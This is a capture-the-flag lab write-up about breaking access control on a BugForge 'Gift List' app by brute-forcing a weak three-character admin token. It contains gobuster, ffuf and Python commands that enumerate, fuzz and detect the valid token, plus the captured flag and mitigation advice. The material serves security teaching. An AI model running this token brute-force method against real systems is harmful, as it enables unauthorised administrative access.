---
title: "Broken Access Control – Admin Access Token Brute Force Leads to Unauthorized Admin Access | Gift List"
date: 2026-04-30 00:00:00 +0530
categories: [Web Security, Broken Access Control]
tags: [broken-access-control, authentication-bypass, token-bruteforce, jwt, ffuf, gobuster, authorization-bypass, bugforge]
platform: BugForge
author: Shivansh Sharma
image:
  path: /assets/images/posts/gift-list-bac.webp
  alt: Broken Access Control Admin Token Attack Flow
---

## Overview

This lab focuses on a notes web application where restricted admin access was protected using an `adminAccessToken`. While normal authentication was handled via JWT, the admin panel relied on an additional weak token mechanism, leading to a complete access control bypass.

The vulnerability was identified through directory enumeration and further analysis of token behavior, which revealed a predictable pattern.

## Objective

Gain unauthorized access to the administrator dashboard by bypassing the `adminAccessToken` restriction and retrieve the hidden flag.

---

## Reconnaissance

### 1. Directory Enumeration

Initial enumeration revealed a hidden endpoint:

```bash
gobuster dir -u https://lab-1777544295383-wdr2nf.labs-app.bugforge.io/ -w /usr/share/wordlists/dirb/big.txt
```

**Discovered endpoint:**

```
/administrator (Status: 302) → /login
```

This indicated a protected admin interface.

### 2. Authentication Analysis

After logging in as a normal user, the following request was observed:

```http
GET /dashboard HTTP/2
Host: lab-1777544295383-wdr2nf.labs-app.bugforge.io
Cookie: token=<JWT>; adminAccessToken=xxxxxx
```

**Key observations:**

- JWT handled user session
- `adminAccessToken` controlled admin access
- Admin token was **not** tied to user identity

---

## Vulnerability Discovery

Using **Burp Sequencer**, the `adminAccessToken` was analyzed and a strong pattern was identified:

- Only the **last 3 characters** changed
- Character set was limited to **lowercase letters (a–z)**

This reduced the keyspace significantly:

```python
import itertools
import string

with open("tokens.txt", "w") as f:
    for combo in itertools.product(string.ascii_lowercase, repeat=3):
        f.write("".join(combo) + "\n")
```

This generated only **17,576 possible combinations**.

---

## Exploitation

### 1. Token Brute Force with ffuf

Due to Burp Suite Community limitations, `ffuf` was used:

```bash
ffuf --request request.txt -w tokens.txt -of json -o results.json
```

### 2. Response Analysis

A Python script was used to detect anomalies in response lengths:

```python
import json
from collections import Counter

with open("results.json", "r") as f:
    data = json.load(f)

lengths = [r["length"] for r in data["results"]]
count = Counter(lengths)

print("Response length frequencies:")
for length, freq in sorted(count.items()):
    print(f"{length}: {freq}")

print("\nUnusual responses:")
for r in data["results"]:
    if count[r["length"]] < 5:
        print(f"Suffix: {r['input']['FUZZ']}")
        print(f"Length: {r['length']}")
        print(f"Status: {r['status']}")
        print("-" * 30)
```

### 3. Finding the Valid Token

The anomaly revealed:

```
Suffix: rls
Length: 7792
Status: 200
```

This indicated a valid admin token.

---

## Exploitation Result

The token was manually replaced in browser storage:

```
adminAccessToken = rls
```

After refreshing the dashboard, access to the **administrator panel** was granted successfully.

---

## Proof of Exploitation

Flag retrieved from the admin panel:

```
bug{KHeTEAium0cH5ry5NqWPiccm1kfMeBYq}
```

---

## Impact

- Complete bypass of administrative access control
- Exposure of sensitive admin functionality
- Weak token entropy allowed full brute force attack
- No rate limiting or lockout mechanism present

---

## Mitigation

- Use cryptographically secure random tokens (CSPRNG)
- Avoid predictable token patterns
- Bind admin tokens to user session and identity
- Implement rate limiting on sensitive endpoints
- Monitor repeated authentication anomalies
- Avoid relying on secondary static tokens for authorization

---

## Real-World Insight

This type of issue is common when developers introduce a secondary authorization layer (like `adminAccessToken`) without proper security design.

Even if primary authentication (JWT/session) is secure, **weak supplementary tokens can completely break the security model**.

In real systems, similar flaws have led to full admin takeover when:

- Tokens were partially predictable
- No rate limiting existed
- Token validation logic was inconsistent between endpoints